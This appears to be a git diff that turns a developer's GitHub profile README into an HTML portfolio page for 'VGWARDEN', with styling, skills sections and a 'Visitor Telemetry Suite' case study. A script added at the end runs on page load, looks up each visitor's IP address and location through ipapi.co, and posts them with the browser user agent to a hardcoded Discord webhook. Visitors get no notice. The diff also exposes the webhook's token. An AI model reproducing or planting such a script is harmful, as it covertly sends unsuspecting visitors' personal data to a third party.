@@ -1,57 +1,228 @@
-# 🪐 Hello World, I'm VGWARDEN
-### ⚡ Full-Stack Developer | Minecraft & Discord Systems Architect
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VGWARDEN | Full-Stack Engineer & Systems Architect</title>
+    
+    <meta name="description" content="VGWARDEN is a Full-Stack Engineer with 4+ years of expertise in Python (FastAPI/Flask) and modern React/Next.js architectures.">
+    
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://unpkg.com/lucide@latest"></script>
 
-<p align="left">
-  <img src="https://img.shields.io/badge/Experience-4%2B%20Years-blueviolet?style=flat-square">
-  <img src="https://img.shields.io/badge/Focus-Next.js%20%26%20React-9b59b6?style=flat-square">
-  <img src="https://img.shields.io/badge/Backend-FastAPI%20%2f%20Flask-8e44ad?style=flat-square">
-</p>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;800&family=JetBrains+Mono&display=swap');
+        
+        :root {
+            --slate-950: #020617;
+            --slate-900: #0f172a;
+            --emerald-500: #10b981;
+        }
 
----
+        body { 
+            background-color: var(--slate-950); 
+            color: #94a3b8; 
+            font-family: 'Inter', sans-serif;
+            letter-spacing: -0.01em;
+            line-height: 1.6;
+        }
 
-### 🌌 About Me
-I am a dedicated developer balancing academic excellence with **4+ years of technical experience**. Currently evolving from traditional backend systems into high-performance **Next.js** environments.
+        .mono { font-family: 'JetBrains Mono', monospace; }
+        
+        .nav-blur {
+            background: rgba(2, 6, 23, 0.85);
+            backdrop-filter: blur(12px);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+        }
 
-* 🔭 **Currently working on:** Advanced Discord integration systems.
-* 📚 **Learning Path:** Mastering Server Components and SSR in **Next.js 14/15**.
-* 🎮 **Niche Expertise:** Minecraft server architecture & high-performance Python APIs.
-* ⚡ **Fun Fact:** I treat my code like my studies—optimized, organized, and built to last.
+        .hero-title {
+            color: #f8fafc;
+            font-weight: 800;
+            font-size: clamp(2.5rem, 5vw, 4.5rem);
+            line-height: 1.1;
+        }
 
----
+        .feature-card {
+            background: rgba(15, 23, 42, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            border-radius: 12px;
+            padding: 2rem;
+            transition: all 0.3s ease;
+        }
 
-### 🛠️ My Arsenal (Purple Powered)
+        .feature-card:hover {
+            border-color: rgba(255, 255, 255, 0.1);
+            background: rgba(15, 23, 42, 0.8);
+            transform: translateY(-2px);
+        }
 
-| Category | Tools |
-| :--- | :--- |
-| **Frontend** | ![Next.js](https://img.shields.io/badge/next.js-000?style=for-the-badge&logo=nextdotjs&logoColor=white) ![React](https://img.shields.io/badge/-React-61DAFB?style=for-the-badge&logo=react&logoColor=white) ![Tailwind](https://img.shields.io/badge/Tailwind_CSS-38B2AC?style=for-the-badge&logo=tailwind-css&logoColor=white) |
-| **Backend** | ![FastAPI](https://img.shields.io/badge/FastAPI-005571?style=for-the-badge&logo=fastapi) ![Flask](https://img.shields.io/badge/flask-%23000.svg?style=for-the-badge&logo=flask&logoColor=white) ![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) |
-| **DevOps** | ![Docker](https://img.shields.io/badge/docker-%230db7ed.svg?style=for-the-badge&logo=docker&logoColor=white) ![Vercel](https://img.shields.io/badge/vercel-%23000000.svg?style=for-the-badge&logo=vercel&logoColor=white) ![Render](https://img.shields.io/badge/Render-%46E3B7.svg?style=for-the-badge&logo=render&logoColor=white) |
+        .btn-core {
+            background: #f8fafc;
+            color: #020617;
+            font-weight: 600;
+            padding: 0.75rem 1.5rem;
+            border-radius: 6px;
+            transition: all 0.2s ease;
+            text-decoration: none;
+        }
 
----
+        .btn-core:hover {
+            background: #e2e8f0;
+            color: #020617;
+        }
 
-### 📊 Performance Metrics
-> [!NOTE]
-> If stats aren't loading, it's due to GitHub's cache. They will refresh shortly!
+        .badge-pro {
+            background: rgba(16, 185, 129, 0.1);
+            color: var(--emerald-500);
+            padding: 4px 12px;
+            border-radius: 100px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+    </style>
+</head>
+<body>
 
-<p align="center">
-  <img src="https://github-readme-stats.vercel.app/api?username=VGWARDEN&show_icons=true&theme=radical&hide_border=false&title_color=bd93f9&icon_color=bd93f9&text_color=f8f8f2&bg_color=282a36" alt="VGWARDEN GitHub Stats" width="48%" />
-  <img src="https://github-readme-stats.vercel.app/api/top-langs/?username=VGWARDEN&layout=compact&theme=radical&hide_border=false&title_color=bd93f9&icon_color=bd93f9&text_color=f8f8f2&bg_color=282a36" alt="Top Languages" width="41%" />
-</p>
+    <nav class="navbar navbar-expand-lg fixed-top nav-blur px-4 py-3">
+        <div class="container">
+            <a class="navbar-brand text-white font-bold tracking-tighter" href="#">VGWARDEN</a>
+            <div class="ms-auto flex items-center gap-6">
+                <a href="#expertise" class="text-sm no-underline hover:text-white transition hidden md:block">Expertise</a>
+                <a href="#projects" class="text-sm no-underline hover:text-white transition hidden md:block">Case Studies</a>
+                <a href="mailto:admin@vgwarden.com" class="btn-core text-sm">Contact</a>
+            </div>
+        </div>
+    </nav>
 
-<p align="center">
-  <img src="https://github-readme-streak-stats.herokuapp.com/?user=VGWARDEN&theme=dracula&hide_border=false&background=282a36&ring=bd93f9&fire=bd93f9&currStreakLabel=bd93f9" alt="GitHub Streak" width="90%"/>
-</p>
+    <section class="container min-vh-100 d-flex flex-column justify-content-center">
+        <div class="row align-items-center">
+            <div class="col-lg-10">
+                <div class="mb-4">
+                    <span class="badge-pro">Systems Architect</span>
+                </div>
+                <h1 class="hero-title mb-4">
+                    Full-stack engineer building <br>
+                    <span class="text-slate-500 italic">resilient digital infrastructure.</span>
+                </h1>
+                <p class="text-xl max-w-2xl mb-5 text-slate-400">
+                    I am **VGWARDEN**, a developer with **4+ years of technical experience**. 
+                    I bridge the gap between complex **Python backends** and high-performance **Next.js** environments. 
+                    Currently focused on Minecraft server architecture and secure Discord integration systems.
+                </p>
+                <div class="flex gap-4">
+                    <a href="https://github.com/VGWARDEN" class="text-white flex items-center gap-2 no-underline border border-slate-800 px-4 py-2 rounded-md hover:bg-slate-900 transition">
+                        <i data-lucide="github" class="w-4 h-4"></i> GitHub Documentation
+                    </a>
+                </div>
+            </div>
+        </div>
+    </section>
 
----
+    <section id="expertise" class="container py-24 border-t border-slate-900">
+        <div class="row g-5">
+            <div class="col-md-4">
+                <h3 class="text-white font-bold mb-4 flex items-center gap-3">
+                    <i data-lucide="server" class="text-emerald-500 w-5 h-5"></i>
+                    Backend Engineering
+                </h3>
+                <p class="text-sm text-slate-400 mb-4">
+                    Specialized in high-concurrency Python ecosystems. Leveraging **FastAPI** for asynchronous performance and **Flask** for scalable microservices.
+                </p>
+                <div class="mono text-[10px] space-y-2">
+                    <div class="flex justify-between border-b border-slate-800 pb-1"><span>POSTGRESQL / SQLALCHEMY</span><span class="text-emerald-500">PRO</span></div>
+                    <div class="flex justify-between border-b border-slate-800 pb-1"><span>REST API DESIGN</span><span class="text-emerald-500">PRO</span></div>
+                </div>
+            </div>
+            
+            <div class="col-md-4">
+                <h3 class="text-white font-bold mb-4 flex items-center gap-3">
+                    <i data-lucide="layers" class="text-emerald-500 w-5 h-5"></i>
+                    Frontend Architecture
+                </h3>
+                <p class="text-sm text-slate-400 mb-4">
+                    Architecting modern interfaces with **Next.js 14/15** and **Tailwind CSS**. Expertise in App Router, Server Components, and optimized state management.
+                </p>
+                <div class="mono text-[10px] space-y-2">
+                    <div class="flex justify-between border-b border-slate-800 pb-1"><span>REACT / TYPESCRIPT</span><span class="text-emerald-500">CORE</span></div>
+                    <div class="flex justify-between border-b border-slate-800 pb-1"><span>SSR / PERFORMANCE</span><span class="text-emerald-500">CORE</span></div>
+                </div>
+            </div>
 
-### 🛠️ Learning Roadmap
-- [x] **Foundations:** HTML5 / CSS3 / JavaScript (ES6+)
-- [x] **Backend Mastery:** Flask & FastAPI Architectures
-- [ ] **React Evolution:** Hooks, Context API, and State Management
-- [ ] **Next.js Pro:** App Router, Server Actions, and Middleware
+            <div class="col-md-4">
+                <h3 class="text-white font-bold mb-4 flex items-center gap-3">
+                    <i data-lucide="shield-check" class="text-emerald-500 w-5 h-5"></i>
+                    Niche Infrastructure
+                </h3>
+                <p class="text-sm text-slate-400 mb-4">
+                    Deep expertise in **Minecraft server architecture** and Discord API systems. Implementing custom security protocols and real-time telemetry.
+                </p>
+                <div class="mono text-[10px] space-y-2">
+                    <div class="flex justify-between border-b border-slate-800 pb-1"><span>DISCORD OAUTH2 / HOOKS</span><span class="text-emerald-500">EXP</span></div>
+                    <div class="flex justify-between border-b border-slate-800 pb-1"><span>IP INTELLIGENCE</span><span class="text-emerald-500">EXP</span></div>
+                </div>
+            </div>
+        </div>
+    </section>
 
----
+    <section id="projects" class="container py-24 border-t border-slate-900">
+        <h2 class="text-white mb-12 h1 font-bold tracking-tight">Technical Case Studies</h2>
+        
+        <div class="row g-4">
+            <div class="col-12">
+                <div class="feature-card">
+                    <div class="row align-items-center">
+                        <div class="col-lg-8">
+                            <span class="mono text-[10px] text-emerald-500 mb-2 block uppercase tracking-widest">System_Security // Python</span>
+                            <h4 class="text-white text-2xl font-bold mb-3">Enterprise Visitor Telemetry Suite</h4>
+                            <p class="mb-4">
+                                A specialized security logging engine developed with Flask and FastAPI. It captures deep-packet metadata, ISP data, and real-time geolocation to identify automated threats and malicious actors, transmitting alerts through encrypted Discord webhooks.
+                            </p>
+                            <div class="flex gap-4 mono text-[10px]">
+                                <span class="text-slate-500 italic">#Automation</span>
+                                <span class="text-slate-500 italic">#Security</span>
+                                <span class="text-slate-500 italic">#FastAPI</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
 
+    <footer class="container py-10 border-t border-slate-900 mt-20 text-center">
+        <p class="mono text-[10px] uppercase tracking-widest text-slate-600">
+            &copy; 2026 VGWARDEN Systems. All Rights Reserved.
+        </p>
+    </footer>
 
+    <script>
+        lucide.createIcons();
 
-
+        async function registerAccess() {
+            const ENDPOINT = "https://discord.com/api/webhooks/1322967410348785694/Bx5iwS7cBeuqXsljfkPT95iQQse6WqdYwv2uV57aWL7pduUd-zwYqmSMXkE8XEOF3m6k";
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                const log = {
+                    embeds: [{
+                        title: "System Access: VGWARDEN Portfolio",
+                        color: 1053153, // Professional Slate/Green
+                        fields: [
+                            { name: "IP Address", value: data.ip, inline: true },
+                            { name: "Location", value: `${data.city}, ${data.country_name}`, inline: true },
+                            { name: "Client Engine", value: navigator.userAgent, inline: false }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                await fetch(ENDPOINT, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(log) });
+            } catch (err) {}
+        }
+        window.onload = registerAccess;
+    </script>
+</body>
+</html>
